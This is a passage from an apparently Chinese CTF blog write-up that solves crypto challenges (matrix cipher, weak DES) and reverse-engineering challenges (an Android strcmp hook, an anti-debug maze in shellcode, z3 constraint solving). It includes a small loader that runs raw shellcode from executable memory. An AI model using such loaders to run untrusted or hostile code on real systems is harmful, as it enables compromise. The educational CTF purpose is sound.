ord(m[x])<span class=\"number\">-97</span></span><br><span class=\"line\">        c.append(ord(m[x])<span class=\"number\">-97</span>)</span><br><span class=\"line\"><span class=\"keyword\">print</span> c</span><br><span class=\"line\"></span><br><span class=\"line\">temp = []</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>,len(c),<span class=\"number\">2</span>):</span><br><span class=\"line\">    temp.append(chr(((key[<span class=\"number\">0</span>] * c[i]+key[<span class=\"number\">1</span>] * c[i+<span class=\"number\">1</span>])%<span class=\"number\">26</span>)+<span class=\"number\">97</span>))</span><br><span class=\"line\">    temp.append(chr(((key[<span class=\"number\">2</span>] * c[i] + key[<span class=\"number\">3</span>] * c[i+<span class=\"number\">1</span>])%<span class=\"number\">26</span>)+<span class=\"number\">97</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">temp = <span class=\"string\">''</span>.join(temp)</span><br><span class=\"line\"><span class=\"keyword\">print</span> temp[::<span class=\"number\">-1</span>]</span><br></pre></td></tr></table></figure>\n<p>得到llihllamssihtrednu</p>\n<p>题目中说“走下坡路”，所以想到字符串经过反向处理。</p>\n<p>得到flag{underthissmallhill}。</p>\n<ul>\n<li><strong>weak_des</strong><br>给出了加密代码<br>参考0xptdg战队的py<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#coding:utf-8</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Cipher <span class=\"keyword\">import</span> DES</span><br><span class=\"line\"><span class=\"keyword\">import</span> libnum</span><br><span class=\"line\">ct=open(<span class=\"string\">'ciphertext'</span>,<span class=\"string\">'rb'</span>).read()</span><br><span class=\"line\">KEY=libnum.n2s(<span class=\"number\">0xe0e0e0e0f1f1f1f1</span>)</span><br><span class=\"line\">IV=<span class=\"string\">'13245678'</span></span><br><span class=\"line\">a=DES.new(KEY,DES.MODE_OFB,IV)</span><br><span class=\"line\"><span class=\"keyword\">print</span> a.decrypt(ct)</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">The furthest distance in the world</span><br><span class=\"line\"></span><br><span class=\"line\">Is not between life and death</span><br><span class=\"line\">But when I stand infront of you</span><br><span class=\"line\">Yet you don&apos;t know that I love you</span><br><span class=\"line\"></span><br><span class=\"line\">Is not when I stand infront of you</span><br><span class=\"line\">Yet you can&apos;t see my love</span><br><span class=\"line\">But when undoubtedly knowing the love from both</span><br><span class=\"line\">Yet can not be together</span><br><span class=\"line\"></span><br><span class=\"line\">Is not being apart while being in love</span><br><span class=\"line\">But when painly cannot resist the yearning</span><br><span class=\"line\">Yet pretending you have never been in my heart</span><br><span class=\"line\"></span><br><span class=\"line\">Is not when painly can not resist the yearning</span><br><span class=\"line\">yet pretending you have never been in my heart</span><br><span class=\"line\">but using one&apos;s in different heart</span><br><span class=\"line\">To dig an uncrossable river</span><br><span class=\"line\">For the one who loves you</span><br><span class=\"line\"></span><br><span class=\"line\">flag&#123;_poor_single_dog_has_found_an_echo_from_it&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"个人和团体的re-pwn解题汇总\"><a href=\"#个人和团体的re-pwn解题汇总\" class=\"headerlink\" title=\"个人和团体的re+pwn解题汇总\"></a>个人和团体的re+pwn解题汇总</h2><h3 id=\"re\"><a href=\"#re\" class=\"headerlink\" title=\"re\"></a>re</h3><ul>\n<li><strong>easy-compare</strong><br>jadx先打开看MainActivity</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MainActivity</span> <span class=\"keyword\">extends</span> <span class=\"title\">AppCompatActivity</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title\">onCreate</span><span class=\"params\">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>.onCreate(savedInstanceState);</span><br><span class=\"line\">        setContentView((<span class=\"keyword\">int</span>) R.layout.activity_main);</span><br><span class=\"line\">        ((Button) findViewById(R.id.button)).setOnClickListener(<span class=\"keyword\">new</span> OnClickListener() &#123;</span><br><span class=\"line\">            <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">onClick</span><span class=\"params\">(View v)</span> </span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (Check.checkflag(((EditText) MainActivity.<span class=\"keyword\">this</span>.findViewById(R.id.editText)).getText().toString())) &#123;</span><br><span class=\"line\">                    Toast.makeText(MainActivity.<span class=\"keyword\">this</span>, <span class=\"string\">\"you are right~!\"</span>, <span class=\"number\">1</span>).show();</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    Toast.makeText(MainActivity.<span class=\"keyword\">this</span>, <span class=\"string\">\"wrong!\"</span>, <span class=\"number\">1</span>).show();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>调用了so中的Check.checkflag函数校验flag，定位到so中的函数</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">signed</span> <span class=\"keyword\">int</span> __<span class=\"function\">fastcall <span class=\"title\">Java_com_testjava_jack_fakefunc_Check_checkflag</span><span class=\"params\">(<span class=\"keyword\">int</span> a1)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">signed</span> <span class=\"keyword\">int</span> v1; <span class=\"comment\">// r4</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *v2; <span class=\"comment\">// r5</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v1 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v2 = (<span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *)(*(<span class=\"keyword\">int</span> (**)(<span class=\"keyword\">void</span>))(*(_DWORD *)a1 + <span class=\"number\">676</span>))();</span><br><span class=\"line\">  j_getKey();</span><br><span class=\"line\">  _android_log_print(<span class=\"number\">4</span>, <span class=\"string\">\"INJECT\"</span>, <span class=\"string\">\"asdasd\"</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(v2, <span class=\"string\">\"this_is_easy_so\"</span>) )</span><br><span class=\"line\">    v1 = <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> v1;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>发现是与一个固定的字符串对比</p>\n<p>但是尝试一下程序中提交<code>this_is_easy_so</code>并不对，查看导出表信息，发现存在init_arrary里面对strcmp进行了Inline hook,定位到fake function。发现是aes，key就是动态解密的固定base64字符串。解密得到flag</p>\n<ul>\n<li><strong>Get-A-Way</strong><br>shell这个二进制数据是一段shellcode，先写程序把它Load起来</li>\n</ul>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">FILE *fp = fopen(<span class=\"string\">\"file.bin\"</span>, <span class=\"string\">\"rb\"</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp)</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    fseek(fp, <span class=\"number\">0</span>, SEEK_END);</span><br><span class=\"line\">    DWORD dwSize = ftell(fp);</span><br><span class=\"line\">    fseek(fp, <span class=\"number\">0</span>, SEEK_SET);</span><br><span class=\"line\">    LPVOID pAddr = VirtualAlloc(<span class=\"number\">0</span>, dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">    fread(pAddr, dwSize, <span class=\"number\">1</span>, fp);</span><br><span class=\"line\">    fclose(fp);</span><br><span class=\"line\">    __asm</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      mov eax, pAddr;</span><br><span class=\"line\">      call eax;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n<p>提示输入key，随便输入一个</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">F:\\Project\\LoadShell.exe</span><br><span class=\"line\">please input your answer:asdsd</span><br><span class=\"line\">wrong way</span><br></pre></td></tr></table></figure>\n<p>od载入看下</p>\n<p>跟踪会发现在0x10000000地址释放出主要模块</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">100010CD    85C0            test eax,eax</span><br><span class=\"line\">100010CF    74 11           je short 100010E2</span><br><span class=\"line\">100010D1    B9 19000000     mov ecx,0x19</span><br><span class=\"line\">100010D6    BE C0710110     mov esi,0x100171C0</span><br><span class=\"line\">100010DB    BF 30720110     mov edi,0x10017230</span><br><span class=\"line\">100010E0    F3:A5           rep movs dword ptr es:[edi],dword ptr ds&gt;</span><br><span class=\"line\">100010E2    68 58440110     push 0x10014458                          ; ASCII &quot;please input your answer:&quot;</span><br><span class=\"line\">100010E7    E8 48170000     call 10002834</span><br><span class=\"line\">100010EC    83C4 04         add esp,0x4</span><br><span class=\"line\">100010EF    C64424 10 00    mov byte ptr ss:[esp+0x10],0x0</span><br><span class=\"line\">100010F4    8D4424 11       lea eax,dword ptr ss:[esp+0x11]</span><br><span class=\"line\">100010F8    6A 63           push 0x63</span><br><span class=\"line\">100010FA    6A 00           push 0x0</span><br><span class=\"line\">100010FC    50              push eax</span><br><span class=\"line\">100010FD    E8 AE660000     call 100077B0</span><br><span class=\"line\">10001102    83C4 0C         add esp,0xC</span><br><span class=\"line\">10001105    8D4424 10       lea eax,dword ptr ss:[esp+0x10]</span><br><span class=\"line\">10001109    50              push eax</span><br><span class=\"line\">1000110A    68 74440110     push 0x10014474                          ; ASCII &quot;%s&quot;</span><br></pre></td></tr></table></figure>\n<p>在此处下断点分析发现是个迷宫问题，dump下迷宫来</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    0x01, 0x00, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,</span><br><span class=\"line\">    0x00, 0x00, 0x00, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x00, 0x01, 0x01, 0x00,</span><br><span class=\"line\">    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x01, 0x00, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01,</span><br><span class=\"line\">    0x01, 0x01, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x01, 0x01, 0x01, 0x01, 0x00, 0x01, 0x00,</span><br><span class=\"line\">    0x01, 0x00, 0x00, 0x01, 0x01, 0x01, 0x01, 0x00, 0x01, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01, 0x01,</span><br><span class=\"line\">    0x01, 0x00, 0x00, 0x00, 0x01, 0x01, 0x01, 0x00, 0x00, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01,</span><br><span class=\"line\">    0x01, 0x01, 0x00, 0x01&#125;;</span><br></pre></td></tr></table></figure>\n<p>按照迷宫得到的解并不对，我们仔细查看内存发现调用了一些反调试的函数，根据回溯，回溯到</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">100010C2   /0F85 D8000000   jnz 100011A0</span><br><span class=\"line\">100010C8   |E8 B3130000     call 10002480</span><br><span class=\"line\">100010CD   |85C0            test eax,eax</span><br><span class=\"line\">100010CF   |74 11           je short 100010E2</span><br><span class=\"line\">100010D1   |B9 19000000     mov ecx,0x19</span><br><span class=\"line\">100010D6   |BE C0710110     mov esi,0x100171C0</span><br><span class=\"line\">100010DB   |BF 30720110     mov edi,0x10017230</span><br></pre></td></tr></table></figure>\n<p>这里会因为反调试来修改迷宫数组，在修改之前dump真正的迷宫</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">01 00 01 01 01 01 01 01 01 01 01 00 01 00 00 00 01 01 01 01 01 00 00 00 01 00 01 01 01 01 01 01</span><br><span class=\"line\">01 01 01 00 01 01 01 01 01 01 01 01 00 00 00 00 00 01 01 01 01 01 00 01 01 01 00 01 01 01 01 01</span><br><span class=\"line\">01 00 00 00 00 01 01 01 01 01 01 00 01 01 01 01 01 01 01 01 01 00 00 00 00 01 01 01 01 01 01 01</span><br><span class=\"line\">01 01 00 01</span><br></pre></td></tr></table></figure>\n<p>得到解</p>\n<p>ssddwddsssdddssaaassddds</p>\n<p>输入得到flag</p>\n<p>81dsa65edckyqutiaghjw3w2</p>\n<ul>\n<li><strong>LoginToMe</strong><br>拖入ida看下就这么些代码</li>\n</ul>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> __<span class=\"function\">cdecl <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **argv, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **envp)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> v3; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int16 s; <span class=\"comment\">// [rsp+10h] [rbp-70h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int16 v6; <span class=\"comment\">// [rsp+12h] [rbp-6Eh]</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> v7; <span class=\"comment\">// [rsp+14h] [rbp-6Ch]</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> v8; <span class=\"comment\">// [rsp+18h] [rbp-68h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int16 v9; <span class=\"comment\">// [rsp+1Ch] [rbp-64h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int16 v10; <span class=\"comment\">// [rsp+1Eh] [rbp-62h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int16 v11; <span class=\"comment\">// [rsp+20h] [rbp-60h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int16 v12; <span class=\"comment\">// [rsp+22h] [rbp-5Eh]</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> v13; <span class=\"comment\">// [rsp+70h] [rbp-10h]</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> v14; <span class=\"comment\">// [rsp+74h] [rbp-Ch]</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> v15; <span class=\"comment\">// [rsp+78h] [rbp-8h]</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> i; <span class=\"comment\">// [rsp+7Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(&amp;s, <span class=\"number\">0</span>, <span class=\"number\">0x60</span>uLL);</span><br><span class=\"line\">  v13 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"input:\"</span>, argv, &amp;v14, argv);</span><br><span class=\"line\">  __isoc99_scanf(<span class=\"string\">\"%s\"</span>, &amp;s);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( <span class=\"built_in\">strlen</span>((<span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *)&amp;s) == <span class=\"number\">20</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v3 = time(<span class=\"number\">0L</span>L);</span><br><span class=\"line\">    srand(v3);</span><br><span class=\"line\">    v15 = rand() % <span class=\"number\">100</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt; v15; ++i )</span><br><span class=\"line\">      ;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( s * v6 != <span class=\"number\">342772773</span></span><br><span class=\"line\">      || s + v6 != <span class=\"number\">39526</span></span><br><span class=\"line\">      || v7 - v8 != <span class=\"number\">1005712381</span></span><br><span class=\"line\">      || (<span class=\"keyword\">unsigned</span> __int16)v7 + HIWORD(v7) != <span class=\"number\">56269</span></span><br><span class=\"line\">      || (<span class=\"keyword\">unsigned</span> __int16)v8 - HIWORD(v8) != <span class=\"number\">15092</span></span><br><span class=\"line\">      || (<span class=\"keyword\">char</span>)v7 * (<span class=\"keyword\">char</span>)v8 != <span class=\"number\">0x29D6</span></span><br><span class=\"line\">      || SBYTE2(v7) * SBYTE2(v8) != <span class=\"number\">12051</span></span><br><span class=\"line\">      || SHIBYTE(v7) + SHIBYTE(v8) != <span class=\"number\">172</span></span><br><span class=\"line\">      || v9 * v10 != <span class=\"number\">171593250</span></span><br><span class=\"line\">      || v9 + v10 != <span class=\"number\">26219</span></span><br><span class=\"line\">      || v11 * v12 != <span class=\"number\">376306868</span></span><br><span class=\"line\">      || v11 + v12 != <span class=\"number\">40341</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">\"check failed~!\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">\"check ok~!\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>对输入的flag进行了条件判断，根据上述条件求解即可。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#-*- coding:utf-8 –*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> z3 <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#定义变量</span></span><br><span class=\"line\"></span><br><span class=\"line\">a = Int(<span class=\"string\">'a'</span>)</span><br><span class=\"line\">b = Int(<span class=\"string\">'b'</span>)</span><br><span class=\"line\">c = Int(<span class=\"string\">'c'</span>)</span><br><span class=\"line\">d = Int(<span class=\"string\">'d'</span>)</span><br><span class=\"line\">e = Int(<span class=\"string\">'e'</span>)</span><br><span class=\"line\">f = Int(<span class=\"string\">'f'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">m = Int(<span class=\"string\">'m'</span>)</span><br><span class=\"line\">n = Int(<span class=\"string\">'n'</span>)</span><br><span class=\"line\">p = Int(<span class=\"string\">'p'</span>)</span><br><span class=\"line\">q = Int(<span class=\"string\">'q'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">solver = Solver()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 设置变量范围</span></span><br><span class=\"line\"></span><br><span class=\"line\">solver.add(a &gt;= <span class=\"number\">0</span>)</span><br><span class=\"line\">solver.add(b &gt;= <span class=\"number\">0</span>)</span><br><span class=\"line\">solver.add(a &lt; <span class=\"number\">0xffff</span>)</span><br><span class=\"line\">solver.add(b &lt; <span class=\"number\">0xffff</span>)</span><br><span class=\"line\">solver.add(c &gt;= <span class=\"number\">0</span>)</span><br><span class=\"line\">solver.add(d &gt;= <span class=\"number\">0</span>)</span><br><span class=\"line\">solver.add(c &lt; <span class=\"number\">0xffff</span>)</span><br><span class=\"line\">solver.add(d &lt; <span class=\"number\">0xffff</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">solver.add(e &gt;= <span class=\"number\">0</span>)</span><br><span class=\"line\">solver.add(f &gt;= <span class=\"number\">0</span>)</span><br><span class=\"line\">solver.add(e &lt; <span class=\"number\">0xffff</span>)</span><br><span class=\"line\">solver.add(f &lt; <span class=\"number\">0xffff</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">solver.add(m &gt;= <span class=\"number\">0</span>)</span><br><span class=\"line\">solver.add(n &gt;= <span class=\"number\">0</span>)</span><br><span class=\"line\">solver.add(m &lt; <span class=\"number\">0xffffffff</span>)</span><br><span class=\"line\">solver.add(n &lt; <span class=\"number\">0xffffffff</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 设置表达式</span></span><br><span class=\"line\"></span><br><span class=\"line\">solver.add(a*b == <span class=\"number\">0x146E4C25</span>)</span><br><span class=\"line\">solver.add(a+b == <span class=\"number\">0x9a66</span>)</span><br><span class=\"line\">solver.add(c*d == <span class=\"number\">0xa3a4e22</span>)</span><br><span class=\"line\">solver.add(c+d == <span class=\"number\">0x666b</span>)</span><br><span class=\"line\">solver.add(e*f == <span class=\"number\">0x166dfcb4</span>)</span><br><span class=\"line\">solver.add(e+f == <span class=\"number\">0x9d95</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">solver.add(m-n == <span class=\"number\">0x3BF1F3FD</span>)</span><br><span class=\"line\">solver.add(m%<span class=\"number\">0x10000</span> +m/<span class=\"number\">0x10000</span> ==<span class=\"number\">0xDBCD</span>)</span><br><span class=\"line\">solver.add(n%<span class=\"number\">0x10000</span> -n/<span class=\"number\">0x10000</span> ==<span class=\"number\">0x3AF4</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#获取结果</span></span><br><span class=\"line\"></span><br><span class=\"line\">print(<span class=\"string\">\"solving...\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(solver.check()==sat):</span><br><span class=\"line\">  <span class=\"keyword\">print</span> solver.model()</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[f = 14644,</span><br><span class=\"line\"> b = 12849,</span><br><span class=\"line\"> a = 26677,</span><br><span class=\"line\"> d = 13625,</span><br><span class=\"line\"> n = 947221353,</span><br><span class=\"line\"> m = 1952933734,</span><br><span class=\"line\"> c = 12594,</span><br><span class=\"line\"> e = 25697]</span><br></pre></td></tr></table></figure>\n<p><strong>exp</strong><br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span 